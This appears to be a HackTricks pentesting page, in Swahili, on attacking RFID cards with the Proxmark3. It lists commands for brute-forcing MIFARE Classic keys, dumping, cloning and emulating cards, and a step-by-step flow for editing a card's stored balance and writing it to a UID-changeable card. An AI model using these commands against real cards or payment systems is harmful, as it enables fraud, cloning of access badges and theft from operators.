# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Kushambulia Mifumo ya RFID kwa Proxmark3

Sakinisha Proxmark3 client ya RRG/Iceman inayodumishwa kikamilifu pamoja na firmware inayolingana, kisha thibitisha sintaksia ya amri kwa build hiyo kwa sababu amri za zamani zilizoonyeshwa hapa chini huenda zimebadilika.<sup>[[1]](#references)[[5]](#references)</sup>

### Kushambulia MIFARE Classic 1KB

MIFARE Classic 1K ina **sehemu 16**, kila moja ikiwa na **blocks 4** za **bytes 16**. Manufacturer block 0 ina data ya UID/manufacturer na ni ya kusomeka tu kwenye kadi halisi za NXP; kadi maalum za clone au “magic” huenda zikiruhusu kuandikwa upya.<sup>[[1]](#references)[[2]](#references)</sup>\
Ili kufikia kila sehemu unahitaji **keys 2** (**A** na **B**) ambazo huhifadhiwa kwenye **block 3 ya kila sehemu** (sector trailer). Sector trailer pia huhifadhi **access bits** zinazotoa ruhusa za **kusoma na kuandika** kwenye **kila block** kwa kutumia keys hizo 2.\
Keys 2 zinafaa kutoa ruhusa ya kusoma ikiwa unajua key ya kwanza, na kuandika ikiwa unajua ya pili (kwa mfano).

Kuna mashambulizi kadhaa yanayoweza kutekelezwa.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** mawasiliano ya **Tag to Reader** ili kujaribu kupata data nyeti. Kwenye kadi hii, unaweza tu kunasa mawasiliano na kukokotoa key iliyotumika kwa sababu **operesheni za kriptografia zinazotumika ni dhaifu**, na ukiwa na maandishi ya kawaida na maandishi yaliyosimbwa unaweza kuikokotoa (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### Mtiririko wa haraka wa MiFare Classic wa kutumia vibaya thamani iliyohifadhiwa

Vituo vinapohifadhi salio kwenye kadi za Classic, mtiririko wa kawaida kutoka mwanzo hadi mwisho ni:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Vidokezo

- `hf mf autopwn` huratibu mashambulizi ya aina ya nested/darkside/HardNested, hurejesha funguo, na kuunda dumps kwenye folda ya client dumps.<sup>[[1]](#references)</sup>
- Kuandika block 0/UID hufanya kazi tu kwenye kadi za magic gen1a/gen2. Kadi za kawaida za Classic zina UID ya kusoma tu.<sup>[[2]](#references)</sup>
- Matumizi mengi hutumia "value blocks" za Classic au checksums rahisi. Hakikisha sehemu zote zilizorudiwa/kuongezewa thamani kinyume na checksums zinaendana baada ya kuhariri.<sup>[[4]](#references)</sup>

Tazama mbinu ya kiwango cha juu zaidi na hatua za kupunguza hatari katika:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Amri Ghafi

Mifumo ya IoT wakati mwingine hutumia **tagi zisizo na chapa au zisizo za kibiashara**. Katika hali hii, unaweza kutumia Proxmark3 kutuma **amri ghafi maalum kwa tagi**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Kwa kutumia maelezo haya, unaweza kutafuta taarifa kuhusu kadi na jinsi ya kuwasiliana nayo. Proxmark3 hukuruhusu kutuma amri ghafi kama hii: `hf 14a raw -p -b 7 26`

### Scripts

Programu ya Proxmark3 huja na orodha iliyopakiwa awali ya **automation scripts** unazoweza kutumia kutekeleza kazi rahisi. Ili kupata orodha nzima, tumia amri ya `script list`. Kisha, tumia amri ya `script run`, ikifuatiwa na jina la script:

```
proxmark3> script run mfkeys
```

Unaweza kuandika script ya **kufuzz wasomaji wa tag**, kwa hivyo baada ya kunakili data ya **kadi halali**, andika tu **script ya Lua** inayobadilisha kwa nasibu **bytes** moja au zaidi na kuangalia ikiwa **reader ita-crash** katika marudio yoyote.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: Kadi za HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Taarifa ya NXP kuhusu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Unyonyaji wa athari ya usalama kwenye kadi ya NFC katika KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Usakinishaji wa Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
